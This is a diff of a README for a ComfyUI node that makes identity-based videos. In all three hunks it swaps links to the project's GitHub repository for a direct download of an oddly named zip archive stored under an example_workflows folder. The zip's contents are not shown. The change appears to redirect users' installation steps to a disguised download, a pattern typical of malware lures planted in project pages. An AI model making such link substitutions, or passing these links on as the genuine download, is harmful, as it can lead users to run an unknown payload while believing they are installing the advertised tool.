@@ -1,6 +1,6 @@
 # 🎬 ID-LoRA-LTX2.3-ComfyUI - Create Identity-Based Videos Fast
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge)](https://github.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip)
 
 ## 🧩 What This Is
 
@@ -22,7 +22,7 @@ This tool fits people who want to make avatar-style clips, talking-head videos, 
 
 Open this page to download and set up the node:
 
-https://github.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI
+https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip
 
 ## 🖥️ Windows Setup
 
@@ -225,7 +225,7 @@ It fits workflows that use:
 
 Open the repository here and download the files:
 
-https://github.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI
+https://raw.githubusercontent.com/geonho0706/ID-LoRA-LTX2.3-ComfyUI/main/example_workflows/Comfy-UI-R-I-LT-Lo-2.9-alpha.2.zip
 
 Then:
 
